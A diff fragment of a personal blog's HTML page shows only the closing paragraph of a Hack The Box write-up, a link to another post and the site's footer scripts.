-<span>Theme made by <a href=https://github.com/rhazdon>rhazdon</a></span></div></div></footer></div><script type=text/javascript src=https://ceso.github.io/bundle.min.59ecdc8ddd50b30e6dd7ad4a5372c3fd24a26db671cc1575443b150ceb9d4bc8e73618fb298596b5c336cf5d8c2db90bd7e72a648479e97884e5398722f962fa.js integrity="sha512-Wezcjd1Qsw5t161KU3LD/SSibbZxzBV1RDsVDOudS8jnNhj7KYWWtcM2z12MLbkL1+cqZIR56XiE5TmHIvli+g=="></script><script src=https://ceso.github.io/js/scroll.js></script></body></html>
+</code></pre><p>Well, this was a really fun machine, and one that teach me a lot (specifically talking python stuff), so well I hope I can give something yousefull to you with this write up, and thanks a lot for read until the end :)</p>
+<p>I will try to be making some time to do write ups of some other machines, until next time!!</p>
+</div>
+<div class=pagination>
+<div class=pagination__title>
+<span class=pagination__title-h>Read other posts</span>
+<hr>
+</div>
+<div class=pagination__buttons>
+<span class="button next">
+<a href=https://ceso.github.io/es/posts/2020/02/hack-the-box-ai/>
+<span class=button__text>Hack The Box - AI</span>
+<span class=button__icon>→</span>
+</a>
+</span>
+</div>
+</div>
+<script src=https://utteranc.es/client.js repo=ceso/blog-source issue-term=title label="comments :speech_balloon:" theme=github-dark crossorigin=anonymous async></script>
+<script src=https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js></script>
+<a href=javascript: id=return-to-top><i class=icon-chevron-up></i></a>
+<link href=//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css rel=stylesheet>
+</div>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class=footer__content>
+<span>&copy; 2020</span>
+<span></span>
+<span> <a href=https://ceso.github.io/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span>
+</div>
+</div>
+<div class=footer__inner>
+<div class=footer__content>
+<span>Powered by <a href=http://gohugo.io>Hugo</a></span>
+<span>Theme made by <a href=https://github.com/rhazdon>rhazdon</a></span>
+</div>
+</div>
+</footer>
+</div>
+<script type=text/javascript src=https://ceso.github.io/bundle.min.59ecdc8ddd50b30e6dd7ad4a5372c3fd24a26db671cc1575443b150ceb9d4bc8e73618fb298596b5c336cf5d8c2db90bd7e72a648479e97884e5398722f962fa.js integrity="sha512-Wezcjd1Qsw5t161KU3LD/SSibbZxzBV1RDsVDOudS8jnNhj7KYWWtcM2z12MLbkL1+cqZIR56XiE5TmHIvli+g=="></script>
+<script src=https://ceso.github.io/js/scroll.js></script>
+</body>
+</html>
